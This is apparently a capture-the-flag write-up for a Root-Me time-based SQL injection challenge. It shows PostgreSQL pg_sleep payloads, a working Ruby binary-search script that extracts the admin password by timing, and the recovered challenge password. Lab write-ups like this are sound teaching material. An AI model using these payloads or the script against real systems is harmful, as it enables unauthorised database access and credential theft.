# [SQL Injection Time Based](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Time-based)

Time based SQL injections are exactly what they sound like, they are truly blind injections 
where the only clue that our query has worked is if the response time is a little slower.

Imagine a query that looks like this:

`SELECT * FROM users WHERE username='admin' AND SLEEP(5);`

This would get the `admin` user and "sleep" for five seconds before returning. We can use this 
to our advantage like other blind sql injections to exfiltrate data from the database.

So we find the area of the application that is "injectable". It's the member profile pages.

`action=member&member=1`

Even though we can't see anything because we aren't logged in, we can still trigger time delays.

This takes some trial and error until you figure out what type of database you are working with.

`member=1; select sleep(10)-- ` doesn't do anything (MySQL syntax)

`member=1; select pg_sleep(10)--` does! So we are working with a PostgresQL database.

Now we need to figure out how long are `admin` password is with something like this:

`member=1; select case when length(password)>10 then pg_sleep(10) else pg_sleep(0) end from users where id=1--`

This will sleep if the `admin` password is over 10 characters. And it does sleep, so we can 
keep iterating until we find the exact password length. We finally find that the password is 
13 characters long with:

`member=1; select case when length(password)=13 then pg_sleep(10) else pg_sleep(0) end from users where id=1--`

Now that we know the length of the password we can write a script to brute force it!

```ruby
allChars = ('!'..'~').to_a.sort
pass = ""
url = "http://challenge01.root-me.org/web-serveur/ch40/"
13.times do |i|
  charset = allChars
  while charset.length > 1
    curr = (charset.length - 1) / 2
    char = charset[curr]
    puts "Password(#{i}/13): #{pass}, Testing: #{char}(#{char.ord})"

    injection = "action=member&member=1;select case when "
    injection += "ascii(substr(password,#{pass.length+1},1))>#{char.ord} "
    injection += "then pg_sleep(10) else pg_sleep(0) end from users where id=1--"

    start_time = Time.now
    req = `curl '#{url}?#{injection}' -H 'Cookie: PHPSESSID=qscevnc0cqdj68daqcqrkvvpb4; uid=wKgbZFzuZa+PRTr8Dw2qAg=='`
    total_time = Time.now - start_time

    if total_time > 2
      charset = charset[(curr+1)..-1]
    else
      charset = charset[0..curr]
    end
    system('clear')
  end
  pass += charset[0]
end

puts "Password: #{pass}"
```

And we got our password!

Password is: **T!m3B@s3DSQL!**


